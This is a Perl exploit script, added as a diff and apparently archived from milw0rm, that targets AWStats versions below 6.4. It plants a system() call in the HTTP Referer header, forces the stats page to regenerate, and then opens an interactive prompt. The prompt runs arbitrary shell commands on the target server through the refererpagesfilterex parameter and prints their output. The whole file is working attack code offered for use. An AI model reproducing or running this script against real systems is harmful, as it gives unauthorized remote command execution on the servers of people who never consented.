@@ -1,0 +1,86 @@
+#!/usr/bin/perl
+
+## AWStats < 6.4 command execution exploit
+## based on http://www.idefense.com/application/poi/display?id=290&type=vulnerabilities
+## (c)oded by 1dt.w0lf
+## 11.08.2005
+## RST/GHC
+## http://rst.void.ru
+## http://ghc.ru
+
+## Note
+## Exploitation will not occur until the stats page has been regenerated
+## with the tainted referrer values from the http access log.
+## AWStats is only vulnerable in situations where at least one URLPlugin is enabled.
+
+
+use LWP::UserAgent;
+use HTTP::Headers;
+
+if(@ARGV<1) { &usage; exit(0); }
+
+$path = $ARGV[0];
+header();
+print "Creating shell... Please wait\n";
+
+ $aw = LWP::UserAgent->new() or die;
+ $req = HTTP::Request->new(GET => $path);
+ $req->referer(qq[http://'.system(\$FilterEx{\'refererpages\'}).']);
+ $res = $aw->request($req); 
+ 
+ $aw = LWP::UserAgent->new() or die;
+ $res = $aw->get($path.'?output=refererpages&update=1');
+
+while ()
+ {
+    print "Type command for execute or 'q' for exit # ";
+    while(<STDIN>)
+     {
+        $cmd=$_;
+        chomp($cmd);
+        exit() if ($cmd eq 'q');
+        last;
+     }
+    &run($cmd);
+ }
+
+sub run()
+ {
+ $cmd2  = 'echo 1 && echo _START_ && ';
+ $cmd2 .= $cmd;
+ $cmd2 .= ' && echo _END_';
+ $aw = LWP::UserAgent->new() or die;
+ $res = $aw->post(
+                  "$path",
+                  {
+                   "output" => "refererpages",
+                   "refererpagesfilterex" => "$cmd2"
+                  }
+                 );
+ @result = split(/\n/,$res->content);
+ $runned = 0;
+ $on = 0;
+ print "\n";
+ for $res(@result)
+  {
+    if ($res =~ /^_END_/) { print "\n"; return 0; }
+    if ($on == 1) { print "  $res\n"; }
+    if ($res =~ /^_START_/) { $on = 1; $runned = 1; } 
+  }
+ print "Can't execute command\n" if !$runned;
+ }
+
+sub header()
+{
+ print "--* AWStats < 6.4 exploit by RST/GHC\n";
+ print "--* keep it private, not for public\n";
+}
+
+sub usage()
+ {
+  header();
+  print "usage : r57awstats.pl [path_to_awstats.pl]\n";
+  print "  e.g.: r57awstats.pl http://127.0.0.1/cgi-bin/awstats.pl\n";
+ }
+
+# milw0rm.com [2006-02-17]
